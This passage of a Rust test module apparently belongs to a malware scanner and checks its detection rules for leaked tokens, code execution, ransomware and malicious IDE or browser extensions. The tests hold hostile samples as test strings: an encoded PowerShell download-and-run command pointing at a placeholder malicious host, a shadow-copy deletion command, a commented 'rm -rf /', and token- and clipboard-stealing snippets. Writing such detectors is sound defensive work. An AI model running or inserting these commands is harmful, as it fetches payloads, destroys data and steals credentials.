        assert!(!is_public_ipv4("1.2.300.4"));
        assert!(is_public_ipv4("45.9.148.3"));
    }

    #[test]
    fn test_exec_match_stays_on_its_line() {
        let dir = tempfile::tempdir().unwrap();
        std::fs::write(dir.path().join("a.py"), "x = 1\nexec(code)\n").unwrap();
        let (_, _, matches) = scan_directory_filtered(dir.path(), None, None);
        let m = matches
            .iter()
            .find(|m| m.matched_pattern == "exec() Usage")
            .unwrap();
        assert_eq!(m.line_number, 2);
    }

    #[test]
    fn test_discord_webhook_rule() {
        let rules = build_rules();
        let webhook = rules.iter().find(|r| r.name == "Discord Webhook").unwrap();
        assert!(webhook.pattern.is_match("discord.com/api/webhooks/123456789012345678/ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrst"));
    }

    #[test]
    fn test_telegram_rule() {
        let rules = build_rules();
        let tg = rules
            .iter()
            .find(|r| r.name == "Telegram Bot API Token")
            .unwrap();
        assert!(tg.pattern.is_match("https://api.telegram.org/bot1234567890:ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklm/sendMessage"));
    }

    #[test]
    fn test_aws_key_rule() {
        let rules = build_rules();
        let aws = rules.iter().find(|r| r.name == "AWS Access Key").unwrap();
        assert!(aws.pattern.is_match("AKIA1234567890123456"));
    }

    #[test]
    fn test_github_token_rule() {
        let rules = build_rules();
        let gh = rules.iter().find(|r| r.name == "GitHub Token").unwrap();
        assert!(gh
            .pattern
            .is_match("ghp_abcdefghijklmnopqrstuvwxyz1234567890"));
    }

    #[test]
    fn test_eval_rule() {
        let rules = build_rules();
        let eval = rules.iter().find(|r| r.name == "eval() Usage").unwrap();
        assert!(eval.pattern.is_match("eval(user_input)"));
    }

    #[test]
    fn test_is_critical_file() {
        assert!(is_critical_file("script.py"));
        assert!(is_critical_file("script.js"));
        assert!(is_critical_file("batch.bat"));
        assert!(is_critical_file("package.json"));
        assert!(!is_critical_file("readme.md"));
        assert!(!is_critical_file("image.png"));
    }

    #[test]
    fn test_subprocess_rule() {
        let rules = build_rules();
        let sp = rules
            .iter()
            .find(|r| r.name == "subprocess (Python)")
            .unwrap();
        assert!(sp.pattern.is_match("subprocess.Popen(['cmd.exe']"));
        assert!(sp.pattern.is_match("subprocess.call(['ls']"));
    }

    #[test]
    fn test_powershell_encoded() {
        let rules = build_rules();
        let ps = rules
            .iter()
            .find(|r| r.name == "PowerShell Encoded Command")
            .unwrap();
        assert!(ps.pattern.is_match("powershell -EncodedCommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AbQBhAGwAaQBjAGkAbwB1AHMALgBjAG8AbQAvAHAAYQB5AGwAbwBhAGQAJwApAA=="));
    }

    #[test]
    fn test_ransomware_rule() {
        let rules = build_rules();
        let rw = rules
            .iter()
            .find(|r| r.name == "Shadow Copy Deletion")
            .unwrap();
        assert!(rw.pattern.is_match("vssadmin delete shadows /all /quiet"));
    }

    #[test]
    fn test_vscode_extension_rules() {
        let rules = build_rules();
        let auth = rules
            .iter()
            .find(|r| r.name == "VS Code Session/Token Stealing")
            .unwrap();
        assert!(auth.pattern.is_match(
            "const session = await vscode.authentication.getSession('github', ['repo']);"
        ));

        let clip = rules
            .iter()
            .find(|r| r.name == "VS Code Clipboard Harvesting")
            .unwrap();
        assert!(clip
            .pattern
            .is_match("const text = await vscode.env.clipboard.readText();"));

        let fs = rules
            .iter()
            .find(|r| r.name == "VS Code Workspace File Reading")
            .unwrap();
        assert!(fs
            .pattern
            .is_match("const file = await vscode.workspace.fs.readFile(uri);"));

        let act = rules
            .iter()
            .find(|r| r.name == "VS Code Wildcard Activation")
            .unwrap();
        assert!(act
            .pattern
            .is_match(r#""activationEvents": [ "*", "onCommand:myExt.start" ]"#));
    }

    #[test]
    fn test_jetbrains_plugin_rules() {
        let rules = build_rules();
        let cl = rules
            .iter()
            .find(|r| r.name == "JetBrains Dynamic Classloading")
            .unwrap();
        assert!(cl
            .pattern
            .is_match("URLClassLoader loader = new URLClassLoader(urls);"));

        let pe = rules
            .iter()
            .find(|r| r.name == "JetBrains Process Execution")
            .unwrap();
        assert!(pe.pattern.is_match("Runtime.getRuntime().exec(cmd);"));
    }

    #[test]
    fn test_browser_extension_rules() {
        let rules = build_rules();
        let perm = rules
            .iter()
            .find(|r| r.name == "Browser Extension Dangerous Permissions")
            .unwrap();
        assert!(perm
            .pattern
            .is_match(r#""permissions": ["<all_urls>", "storage"]"#));

        let eval = rules
            .iter()
            .find(|r| r.name == "Browser Extension Dynamic Code Execution")
            .unwrap();
        assert!(eval
            .pattern
            .is_match("chrome.tabs.executeScript(tabId, { code: payload });"));
    }

    #[test]
    fn test_password_manager_rule_ignores_env_property() {
        let rules = build_rules();
        let rule = rules
            .iter()
            .find(|r| r.name == "Password Manager Access")
            .unwrap();
        assert!(!rule.pattern.is_match("const home = process.env.HOME;"));
        assert!(!rule.pattern.is_match("vscode_2.env.appRoot"));
        assert!(rule.pattern.is_match(r#"fs.readFileSync(home + "/.env")"#));
    }

    #[test]
    fn test_dynamic_import_rule_ignores_set_timeout() {
        let rules = build_rules();
        let rule = rules
            .iter()
            .find(|r| r.name == "Dynamic Import/Load")
            .unwrap();
        assert!(!rule.pattern.is_match("setTimeout(vscode.reload, 1000)"));
        assert!(rule.pattern.is_match("__import__('os')"));
    }

    #[test]
    fn test_installed_extension_tampering_rule() {
        let rules = build_rules();
        let rule = rules
            .iter()
            .find(|r| r.name == "Installed Extension Tampering")
            .unwrap();
        // Real malicious-api-extension sample
        assert!(rule.pattern.is_match(
            r#"let dir = homedir + "/.vscode/extensions/ecm3401.example-api-extension-0.0.1";"#
        ));
        assert!(rule
            .pattern
            .is_match(r"let dir = home + '\.vscode\extensions\x.y-1.0.0';"));
    }

    #[test]
    fn test_commented_out_code_is_ignored() {
        let content = "// exec(command, { name: \"X\" }, (err) => {});\n";
        assert!(is_comment_only_line(content, 5)); // inside the comment
        let real = "exec(command, { name: \"X\" }, (err) => {});\n";
        assert!(!is_comment_only_line(real, 3));
        let py = "# os.system('rm -rf /')\n";
        assert!(is_comment_only_line(py, 4));
    }
}
